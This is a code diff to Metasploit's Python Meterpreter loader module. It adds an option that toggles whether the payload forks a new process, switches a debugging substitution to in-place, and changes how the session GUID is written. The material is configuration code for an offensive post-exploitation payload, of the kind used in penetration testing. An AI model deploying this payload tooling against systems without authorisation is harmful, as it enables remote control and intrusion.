@@ -29,6 +29,7 @@ module Payload::Python::MeterpreterLoader
     ))
 
     register_advanced_options([
+      OptBool.new('MeterpreterTryToFork', [ true, 'Fork a new process if the functionality is available', true ]),
       OptBool.new('PythonMeterpreterDebug', [ true, 'Enable debugging for the Python meterpreter', false ])
     ], self.class)
   end
@@ -61,8 +62,11 @@ module Payload::Python::MeterpreterLoader
       txt.gsub('\\', '\\'*8).gsub('\'', %q(\\\\\\\'))
     }
 
+    unless ds['MeterpreterTryToFork']
+      met.sub!('TRY_TO_FORK = True', 'TRY_TO_FORK = False')
+    end
     if ds['PythonMeterpreterDebug']
-      met = met.sub("DEBUGGING = False", "DEBUGGING = True")
+      met.sub!('DEBUGGING = False', 'DEBUGGING = True')
     end
 
     met.sub!('SESSION_EXPIRATION_TIMEOUT = 604800', "SESSION_EXPIRATION_TIMEOUT = #{ds['SessionExpirationTimeout']}")
@@ -75,9 +79,9 @@ module Payload::Python::MeterpreterLoader
     met.sub!("PAYLOAD_UUID = \'\'", "PAYLOAD_UUID = \'#{uuid}\'")
 
     if opts[:stageless] == true
-      session_guid = '\x00' * 16
+      session_guid = '00' * 16
     else
-      session_guid = SecureRandom.uuid.gsub(/-/, '').gsub(/(..)/, '\\x\1')
+      session_guid = SecureRandom.uuid.gsub(/-/, '')
     end
     met.sub!("SESSION_GUID = \'\'", "SESSION_GUID = \'#{session_guid}\'")
 
